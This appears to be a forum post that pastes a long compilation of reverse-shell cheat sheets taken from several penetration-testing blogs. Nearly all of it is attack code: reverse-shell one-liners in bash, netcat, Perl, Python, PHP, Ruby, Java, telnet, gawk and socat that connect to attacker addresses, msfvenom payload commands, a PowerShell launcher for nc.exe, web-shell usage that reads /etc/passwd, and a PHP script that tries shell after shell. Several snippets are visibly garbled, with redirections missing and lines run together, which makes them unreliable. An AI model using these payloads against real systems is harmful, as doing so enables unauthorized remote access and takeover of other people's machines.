O bien puedo soltarle esto:

    Shells & Reverse

    Here’s how to upgrade your Linux reverse shell.
    python -c “import pty; pty.spawn(‘/bin/bash’)”

    You should get a nicer looking prompt, but your job isn’t over yet. Press Ctrl+Z to background your reverse shell, then in your local machine run:

    stty raw -echo
    fg

    Things are going to look really messed up at this point, but don’t worry.

    Just type reset and hit return. You should be presented with a fully interactive shell. You’re welcome.

    There’s still one little niggling thing that can happen, the shell might not be the correct height/width for your terminal. To fix this, go to your local machine and run:

    stty size

    This should return two numbers, which are the number of rows and columns in your terminal. For example’s sake let’s say this command returned 48 120 Head on back to your victim box’s shell and run the following.

    stty -rows 48 -columns 120

    You now have a beautiful interactive shell to brag about.

    Src: https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97

    ALSO (or the same):
    For the longest time when I got reverse shells I would suffer through using non-interactive shells until I learned about upgrading to interactive shells from IppSec:
    python -c ‘import pty;pty.spawn(“/bin/bash”);’
    CTRL-Z
    stty raw -echo
    fg
    ENTER
    Src: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

    Netcat
    NOTE: Most versions of netcat don’t have -e built-in
    If you’re not sure what -e does, it lets you specify a command to pipe through your reverse shell. There’s a good reason that it’s disabled on most versions of netcat — it’s a gaping security hole. Having said that, if you’re attacking a linux machine, you can get around this by using the following reverse shell one-liner.

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

    Which will pipe /bin/sh back to 10.0.0.1 on port 1234, without using the -e switch. This brings us to the next section nicely:

    Src: https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97

    This brings us to the next section nicely:

    A collection of Linux reverse shell one-liners

    These one-liners are all found on pentestmonkey.net. This website also contains a bunch of other useful stuff!

    Bash

    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

    Perl

    perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

    Python

    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

    PHP

    php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &3 2>&3”);’

    Ruby

    ruby -rsocket -e’f=TCPSocket.open(“10.0.0.1”,1234).to_i;exec sprintf(“/bin/sh -i &%d 2>&%d”,f,f,f)’

    Netcat with -e

    nc -e /bin/sh 10.0.0.1 1234

    Netcat without -e (my personal favourite)

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

    Java

    r = Runtime.getRuntime()
    p = r.exec([“/bin/bash”,”-c”,”exec 5/dev/tcp/10.0.0.1/2002;cat &5 >&5; done”] as String[])
    p.waitFor()

    Src: https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97

    Breaking Out of Limited Shells
    Credit to G0tmi1k for these (or wherever he stole them from!).
    The Python trick:
    python -c ‘import pty;pty.spawn(“/bin/bash”)’
    echo os.system(‘/bin/bash’)
    /bin/sh -i
    Src: https://highon.coffee/blog/linux-commands-cheat-sheet/

    Src: https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/

    #1. netcat

    Surprise!!! Nothing new here. Plain and simple. Fire up a listener on the attacker machine on a port which is reachable from the target and connect back to the listener with netcat. Looks like this.

    images\1-1.png

    #2. netcat with GAPING_SECURITY_HOLE disabled:

    This is a little trick that Ed Skoudis tweeted about in November of last year, but I haven’t seen it widely publicized. It is based on the common technique used to build netcat relays. When the GAPING_SECURITY_HOLE is disabled, which means you don’t have access to the ‘-e’ option of netcat, most people pass on using netcat and move to something else. Well this just isn’t necessary. Create a FIFO file system object and use it as a backpipe to relay standard output from commands piped from netcat to /bin/bash back into netcat. Sounds confusing right? The following image should clear things up.

    images\1-2.png

    #3. netcat without netcat:

    I love “hacks” that use features of the operating system against itself. This is one of those “hacks”. It takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system. It’s not always available, but can be quite handy when it is.

    images\1-3.png

    #4. netcat without netcat or /dev/tcp:

    /dev/tcp not available either? Just use telnet with technique #2.

    images\1-4.png

    #5. telnet-to-telnet:

    I’m not sure why you’d use this technique, but it’s an option, so here it is nonetheless. This is clearly the ugliest of the techniques. This technique uses two telnet sessions connected to remote listeners to pipe input from one telnet session to /bin/bash, and pipe the output to the second telnet session. Commands are entered into one the of the attackers listeners and feedback is received on the other.

    images\1-5.png

    #6. RCE shell:

    On this one I’m cheating a little bit. This applies to Remote Command Execution vulnerabilities only. Rather than manually enter commands into a proxy or browser url, I wrote small python script which gives you the feel of a shell, without spawning anything in reverse from the target. You merely pass the script the vulnerable url with the injectable field replaced with the ” tag and it presents you with a clean interface for entering commands. In the background, the script is making the request to the web server, parsing the response, and presenting it to you.

    images\1-6.png

    #7. PHP reverse shell via interactive console:

    The last technique makes use of the php interactive console. The attacker issues one command which moves to the /tmp directory (because it is typically world writable), uses wget to download a malicious php reverse_tcp backdoor (which the attacker hosts on a web server that he controls), and executes the backdoor via the interactive console.

    images\1-7.png

    #1
    nc -e /bin/bash
    #2
    mknod backpipe p; nc 0backpipe
    #3
    /bin/bash -i > /dev/tcp// 0&1
    #4
    mknod backpipe p; telnet 0backpipe
    #5
    telnet | /bin/bash | telnet
    #7
    wget -O /tmp/bd.php && php -f /tmp/bd.php

    Src: https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/

    Src: https://highon.coffee/blog/reverse-shell-cheat-sheet/

    During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive shell.
    Below are a collection of reverse shells that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.
    If you found this resource usefull you should also check out our penetration testing tools cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing.

    Setup Listening Netcat

    Your remote shell will need a listening netcat instance in order to connect back.

    Set your Netcat listening shell on an allowed port

    Use a port that is likely allowed via outbound firewall rules on the target network, e.g. 80 / 443
    To setup a listening netcat instance, enter the following:
    root@kali:~# nc -nvlp 80
    nc: listening on :: 80 …
    nc: listening on 0.0.0.0 80 …
    NAT requires a port forward

    If you’re attacking machine is behing a NAT router, you’ll need to setup a port forward to the attacking machines IP / Port.
    ATTACKING-IP is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).

    Bash Reverse Shells

    exec /bin/bash 0&0 2>&00<&196;exec 196/dev/tcp/ATTACKING-IP/80; sh &196 2>&196exec 5/dev/tcp/ATTACKING-IP/80
    cat &5 >&5; done

    # or:

    while read line 0&5 >&5; donebash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
    PHP Reverse Shell

    A useful PHP reverse shell:
    php -r ‘$sock=fsockopen(“ATTACKING-IP”,80);exec(“/bin/sh -i &3 2>&3″);’
    (Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)
    Netcat Reverse Shell

    Useful netcat reverse shell examples:
    nc -e /bin/sh ATTACKING-IP 80/bin/sh | nc ATTACKING-IP 80rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
    Telnet Reverse Shell

    rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/ptelnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443Remember to listen on 443 on the attacking machine also.

    Perl Reverse Shell

    perl -e ‘use Socket;$i=”ATTACKING-IP”;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
    Perl Windows Reverse Shell

    perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”ATTACKING-IP:80″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while;’perl -e ‘use Socket;$i=”ATTACKING-IP”;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
    Ruby Reverse Shell

    ruby -rsocket -e’f=TCPSocket.open(“ATTACKING-IP”,80).to_i;exec sprintf(“/bin/sh -i &%d 2>&%d”,f,f,f)’
    Java Reverse Shell

    r = Runtime.getRuntime()
    p = r.exec([“/bin/bash”,”-c”,”exec 5/dev/tcp/ATTACKING-IP/80;cat &5 >&5; done”] as String[])
    p.waitFor()
    Python Reverse Shell

    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ATTACKING-IP”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
    Gawk Reverse Shell

    #!/usr/bin/gawk -f

    BEGIN {
    Port = 8080
    Prompt = “bkd> ”

    Service = “/inet/tcp/” Port “/0/0”
    while (1) {
    do {
    printf Prompt |& Service
    Service |& getline cmd
    if (cmd) {
    while ((cmd |& getline) > 0)
    print $0 |& Service
    close(cmd)
    }
    } while (cmd != “exit”)
    close(Service)
    }
    }
    Kali Web Shells

    The following shells exist within Kali Linux, under /usr/share/webshells/ these are only useful if you are able to upload, inject or transfer the shell to the machine.

    Kali PHP Web Shells

    Kali PHP reverse shells and command shells:
    Command Description
    /usr/share/webshells/php/ php-reverse-shell.php Pen Test Monkey – PHP Reverse Shell
    /usr/share/webshells/ php/php-findsock-shell.php /usr/share/webshells/ php/findsock.c Pen Test Monkey, Findsock Shell. Build gcc -o findsock findsock.c (be mindfull of the target servers architecture), execute with netcat not a browser nc -v target 80
    /usr/share/webshells/ php/simple-backdoor.php PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: http://target.com/simple- backdoor.php?cmd=cat+/etc/passwd
    /usr/share/webshells/ php/php-backdoor.php Larger PHP shell, with a text input box for command execution.

    Tip: Executing Reverse Shells

    The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.

    Kali Perl Reverse Shell

    Kali perl reverse shell:
    Command Description
    /usr/share/webshells/perl/ perl-reverse-shell.pl Pen Test Monkey – Perl Reverse Shell
    /usr/share/webshells/ perl/perlcmd.cgi Pen Test Monkey, Perl Shell. Usage: http://target.com/perlcmd.cgi?cat /etc/passwd

    Kali Cold Fusion Shell

    Kali Coldfusion Shell:
    Command Description
    /usr/share/webshells/cfm/cfexec.cfm Cold Fusion Shell – aka CFM Shell

    Kali ASP Shell

    Classic ASP Reverse Shell + CMD shells:
    Command Description
    /usr/share/webshells/asp/ Kali ASP Shells

    Kali ASPX Shells

    ASP.NET reverse shells within Kali:
    Command Description
    /usr/share/webshells/aspx/ Kali ASPX Shells

    Kali JSP Reverse Shell

    Kali JSP Reverse Shell:
    Command Description
    /usr/share/webshells/jsp/jsp-reverse.jsp Kali JSP Reverse Shell

    Src: https://highon.coffee/blog/reverse-shell-cheat-sheet/

    Src: https://evi1us3r.wordpress.com/reverse-shell-cheat-sheet/

    Reverse Shell Cheat Sheet

    Netcat:
    nc 192.168.1.10 443 -e /bin/bash
    /bin/sh | nc 192.168.1.10 443
    rm -f /tmp/p; mknod /tmp/p p && nc 192.168.1.10 443 0/tmp/p
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f
    Bash:
    bash -i >& /dev/tcp/192.168.1.10/443 0>&1
    /bin/bash -i > /dev/tcp/192.168.1.10/443 0&1
    0<&196;exec 196/dev/tcp/192.168.1.10/443; sh &196 2>&196
    exec 5/dev/tcp/192.168.1.10/443
    cat &5 >&5; done
    exec 5/dev/tcp/192.168.1.10/443
    cat <&5 | while read line 0&5 >&5; done
    Python:
    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.10”,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
    Perl:
    *nix:
    perl -e ‘use Socket;$i=”192.168.1.10″;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
    Windows:
    perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”192.168.1.10-IP:443″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while;’
    perl -e ‘use Socket;$i=”192.168.1.10″;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
    PHP:
    php -r ‘$sock=fsockopen(“192.168.1.10”,443);exec(“/bin/sh -i &3 2>&3”);’
    Ruby:
    ruby -rsocket -e’f=TCPSocket.open(“192.168.1.10”,443).to_i;exec sprintf(“/bin/sh -i &%d 2>&%d”,f,f,f)’
    Windows
    ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
    Java:
    r = Runtime.getRuntime()
    p = r.exec([“/bin/bash”,”-c”,”exec 5/dev/tcp/192.168.1.10/443;cat &5 >&5; done”] as String[])
    p.waitFor()
    Telnet:
    rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.10 443 0/tmp/p
    telnet 192.168.1.10 443 | /bin/bash | telnet 192.168.1.10 443

    Src: https://evi1us3r.wordpress.com/reverse-shell-cheat-sheet/

    Ejecutar comandos con privilegios de usuarios sin shell (nologin / false)

    Usuarios sin shell (nologin).
    grep -i nologin /etc/passwd

    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    apache:x:48:48:Apache:/var/www:/sbin/nologin
    ntp:x:38:38::/etc/ntp:/sbin/nologin

    Ejecutar shell con el usuario apache (configurado con nologin).
    su -s /bin/bash apache

    bash-4.1$ id
    uid=48(apache) gid=48(apache) groups=48(apache)

    Src: https://www.busindre.com/comandos_como_usuarios_sin_shell_nologin

    Breaking out of shells

    • Non-interactive shells
    to break out of non-interactive mode: in /tmp folder
    echo “import pty; pty.spawn(‘/bin/bash’)” > /tmp/test.py
    python /tmp/test.py
    • upgrade non-tty to tty: python -c ‘import pty;pty.spawn(“/bin/sh”)’
    • Escape limited shell
    echo os.system(‘/bin/sh’) OR echo os.system(‘/bin/bash’)

    Kali webshells
    • /usr/share/webshells/php/php-reverse-shell.php
    • /usr/share/webshells/cfm/cfexec.cfm
    • /usr/share/webshells/perl/perl-reverse-shell.pl

    ASP
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.168.168 LPORT=443 -f asp -o shell.asp – also works for exporting .aspx

    Reverse connections
    • echo $secpasswd = ConvertTo-SecureString “password” -AsPlainText -Force > wget-runas.ps1
    echo $mycreds = New-Object System.Management.Automation.PSCredential (“username”, $secpasswd) >> wget-runas.ps1
    echo $computer = “hostname” >> wget-runas.ps1
    echo [System.Diagnostics.Process]::Start(“C:\tmp\nc.exe”,”192.168.168.168 443 -e cmd.exe”, $mycreds.Username, $mycreds.Password, $computer) >> wget-runas.ps1
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget-runas.ps1
    • Linux: os.system(‘nc 192.168.168.168 443 -e /bin/sh’)
    • Windows: nc -nlvp 443 -e cmd.exe

    Src: https://blackwintersecurity.com/tools/

    PHP
    Reverse shells
    • One line: /bin/bash -i > /dev/tcp/192.168.168.169/443 0&1
    • MSFvenom syntax: msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.168 LPORT=443 R > revshell.php

    Src: https://blackwintersecurity.com/tools/

    Execution through PHP webshell

    •
    •
    •
    •
    •

    Shell reversa / inversa mediante una conexión cifrada con socat
    Host que espera la conexión de la shell reversa (atacante):

    openssl req -sha512 -new -x509 -days 365 -nodes -out cert.pem -keyout cert.pem
    socat `tty`,raw,echo=0 openssl-listen:1999,reuseaddr,cert=cert.pem,verify=0

    Host que envía la shell al servidor del atacante (X.X.X.X):

    socat openssl-connect:X.X.X.X:1999,verify=0 exec:bash,pty,stderr,setsid

    Src: https://www.busindre.com/shell_reversa_cifrada_con_socat

    Best PHP Reverse Shell (from Guifre):

    /dev/tcp/’.$ip.’/’.$port.’ 0&1′,
    ‘0<&196;exec 196/dev/tcp/’.$ip.’/’.$port.’; /bin/sh &196 2>&196′,
    ‘/usr/bin/nc ‘.$ip.’ ‘.$port.’ -e /bin/bash’,
    ‘nc.exe -nv ‘.$ip.’ ‘.$port.’ -e cmd.exe’,
    “/usr/bin/perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\””.$ip.”:”.$port.”\”);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while;'”,
    ‘rm -f /tmp/p; mknod /tmp/p p && telnet ‘.$ip.’ ‘.$port.’ 0/tmp/p’,
    ‘perl -e \’use Socket;$i=”‘.$ip.'”;$p=’.$port.’;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};\”
    );
    foreach ($reverse_shells as $reverse_shell) {
    try {echo system($reverse_shell);} catch (Exception $e) {echo $e;}
    try {shell_exec($reverse_shell);} catch (Exception $e) {echo $e;}
    try {exec($reverse_shell);} catch (Exception $e) {echo $e;}
    }
    system(‘id’);
    ?> 

¿Se entiende mejor así? 🙄